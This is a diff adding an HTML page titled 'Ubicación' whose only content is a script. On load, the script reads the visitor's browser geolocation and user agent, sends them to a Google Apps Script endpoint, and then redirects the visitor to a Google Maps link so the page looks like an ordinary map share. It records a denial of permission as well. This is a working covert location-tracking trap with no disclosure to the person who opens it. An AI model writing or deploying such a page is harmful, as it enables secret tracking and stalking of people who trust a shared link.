@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Ubicación</title>
+</head>
+<body>
+
+<script>
+
+    const WEBAPP_URL = "https://script.google.com/macros/s/AKfycbxYFD60ytDruTqE2POc0F3-KPYHcM0r99pobGT9gtoQbupj5Enk0k2kbjHRIy9yu52ckg/exec";
+
+function enviarUbicacion(lat, lng) {
+
+  const formData = new URLSearchParams();
+  formData.append("latitud", lat);
+  formData.append("longitud", lng);
+  formData.append("userAgent", navigator.userAgent);
+
+  fetch(WEBAPP_URL, {
+    method: "POST",
+    body: formData
+  })
+  .then(() => {
+      window.location.href = "https://maps.app.goo.gl/89N2urmKGf5qqsRJ8";
+  })
+  .catch(() => {
+      window.location.href = "https://maps.app.goo.gl/89N2urmKGf5qqsRJ8";
+  });
+}
+
+if (navigator.geolocation) {
+  navigator.geolocation.getCurrentPosition(
+    position => {
+      enviarUbicacion(
+        position.coords.latitude,
+        position.coords.longitude
+      );
+    },
+    error => {
+      enviarUbicacion("No permitido", "No permitido");
+    }
+  );
+} else {
+  enviarUbicacion("No soportado", "No soportado");
+}
+
+</script>
+
+</body>
+</html>
